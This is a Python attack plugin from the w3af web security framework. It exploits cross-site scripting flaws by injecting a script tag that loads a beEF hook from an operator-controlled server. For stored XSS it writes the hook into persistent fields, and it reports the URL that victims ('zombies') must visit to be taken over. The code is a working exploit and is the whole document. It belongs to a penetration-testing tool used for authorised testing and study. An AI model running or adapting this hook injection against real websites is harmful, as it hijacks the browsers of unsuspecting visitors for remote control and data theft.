'''
xssBeef.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


from core.data.fuzzer.fuzzer import *
import core.controllers.outputManager as om
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
import core.data.kb.knowledgeBase as kb
import core.data.parsers.urlParser as urlParser
from core.controllers.w3afException import w3afException
# options
from core.data.options.option import option
from core.data.options.optionList import optionList

class xssBeef(baseAttackPlugin):
    '''
    Exploit XSS vulnerabilities using beEF ( www.bindshell.net/tools/beef/ ) .
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # User configured variables
        self._beefPasswd = ''
        self._beefURL = 'http://localhost/beef/'        # without the hook dir !
        
        # A message to the user
        self._message = 'You can start interacting with the beEF server at: ' + urlParser.urlJoin( self._beefURL, 'ui/' )
        
    def fastExploit(self, url, method, data ):
        '''
        Exploits a web app with osCommanding vuln.
        
        @parameter url: A string containing the Url to exploit ( http://somehost.com/foo.php )
        @parameter method: A string containing the method to send the data ( post / get )
        @parameter data: A string containing data to send with a mark that defines
        which is the vulnerable parameter ( aa=notMe&bb=almost&cc=[VULNERABLE] )
        '''
        return self._shell
    
    def getAttackType(self):
        return 'proxy'
        
    def getVulnName2Exploit( self ):
        return 'xss'
                
    def exploit( self, vuln ):
        '''
        Exploits a remoteFileInclude vuln that was found and stored in the kb.

        @return: True if the shell is working and the user can start calling rexec
        '''
        om.out.information( 'Browser Exploitation Framework - by Wade Alcorn http://www.bindshell.net' )
        xssVulns = kb.kb.getData( 'xss' , 'xss' )
        if not self.canExploit():
            raise w3afException('No cross site scripting vulnerabilities have been found.')
        
        # First I'll configure the beef server, if this is unsuccessfull, then nothing else should be done!
        # POST http://localhost/beef/submit_config.php?config=http://localhost/beef/&passwd=beEFconfigPass HTTP/1.1
        configURL = urlParser.urlJoin( self._beefURL , 'submit_config.php' )
        configURI = configURL + '?config=' + self._beefURL + '&passwd=' + self._beefPasswd
        response = self._urlOpener.GET( configURI )
        if response.getBody().count('BeEF Successfuly Configured'):
            # everything ok!
            pass
        elif response.getBody().count('Incorrect beEF password, please try again.'):
            raise w3afException('Incorrect password for beEF configuration.')
        else:
            raise w3afException('BeEF installation not found.')
            
        
        # Try to get a proxy using one of the vulns
        for vuln in xssVulns:
            om.out.information('Trying to exploit using vulnerability with id: ' + str( vuln.getId() ) )
            if self._generateProxy(vuln):
                # A proxy was generated, I only need one point of xss
                om.out.information('Successfully exploited XSS using vulnerability with id: ' + str( vuln.getId() ) )
                return True
            else:
                om.out.information('Failed to exploit using vulnerability with id: ' + str( vuln.getId() ) )
                    
        return False
                
    def _generateProxy( self, vuln ):
        '''
        @parameter vuln: The vuln to exploit.
        @return: True is a proxy could be established using the vuln parameter.
        '''
        # Check if we really can contact the remote beef install
        if self._verifyVuln( vuln ):
            self._vuln = vuln
            return True
        else:
            return False

    def _verifyVuln( self, vuln ):
        '''
        This command verifies a vuln. This is really hard work! :P

        @return : True if vuln can be exploited.
        '''
        # Internal note:
        # <script language="Javascript" src="http://localhost/beef/hook/beefmagic.js.php"></script>
        toInclude = '<script language="Javascript" src="' + urlParser.urlJoin( self._beefURL, 'hook/beefmagic.js.php' ) + '"></script>'
        if vuln['escapesDouble'] and not vuln['escapesSingle']:
            toInclude = toInclude.replace('"', "'")
            
        if not ( vuln['escapesSingle'] and vuln['escapesDouble'] ) and not vuln['escapesLtGt']:
            # We are almost there...
            if 'permanent' in vuln.keys():
                # Its a permanent / persistant XSS, nice ! =)
                m = vuln['oldMutant']
                m.setModValue( toInclude )
                # Write the XSS
                response = self._sendMutant( m, analyze=False )
                # Read it !
                response = self._sendMutant( vuln.getMutant(), analyze=False )
                if response.getBody().count( toInclude ):
                    om.out.console('The exploited cross site scripting is of type permanent. To be activated, the zombies should navigate to: ' + vuln.getMutant().getURI() )
                    om.out.console( self._message )
                    return True
                else:
                    return False
                        
            else:
                # Its a simple xss
                if vuln.getMethod() == 'GET':
                    # I'll be able to exploit this one.
                    m = vuln.getMutant()
                    m.setModValue( toInclude )
                    response = self._sendMutant( m, analyze=False )
                    if response.getBody().count( toInclude ):
                        om.out.console('To be activated, the zombies should navigate to: ' + m.getURI() )
                        om.out.console( self._message )
                        return True
                    else:
                        return False
    
    def rexec( self, command ):
        '''
        Nothing to do here.
        '''
        return self._message + ' \nType exit to continue using w3af.'
        
    
    def getOptionsXML(self):
        '''
        This method returns a XML containing the Options that the plugin has.
        Using this XML the framework will build a window, a menu, or some other input method to retrieve
        the info from the user. The XML has to validate against the xml schema file located at :
        w3af/core/ui/userInterface.dtd
        
        @return: XML with the plugin options.
        ''' 
        return  '<?xml version="1.0" encoding="ISO-8859-1"?>\
        <OptionList>\
            <Option name="beefURL">\
                <default>http://localhost/beef/</default>\
                <desc>This is the location that the zombies will connect to (do not include the hook directory)</desc>\
                <help>This is configuration is directly passed to beEF XSS exploitation framework.</help>\
                <type>string</type>\
            </Option>\
            <Option name="beefPasswd">\
                <default></default>\
                <desc>The configuration password for beef.</desc>\
                <help>This configuration parameter is needed to change the configuration of beEF.</help>\
                <type>string</type>\
            </Option>\
        </OptionList>\
        '

    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptionsXML().
        
        @parameter optionsMap: A map with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._beefURL = optionsMap['beefURL']
        self._beefPasswd = optionsMap['beefPasswd']

        if self._beefPasswd == '':
            om.out.error('You have to provide a beEF password to use this plugin.')
            return False
            

    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.0
    
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin is an interface to aid with the exploitation of XSS vulnerabilities using beEF.
        
        Two configurable parameters exist:
            - beefURL
            - beefPasswd
            
        Please note that this plugin is only a "caller" to beef and:
            - You have to install beef
            - After running this plugin you have to infect other users with the URL provided by w3af
            - You have to open a browser and point it to your beef installation in order to manage zombies
        '''
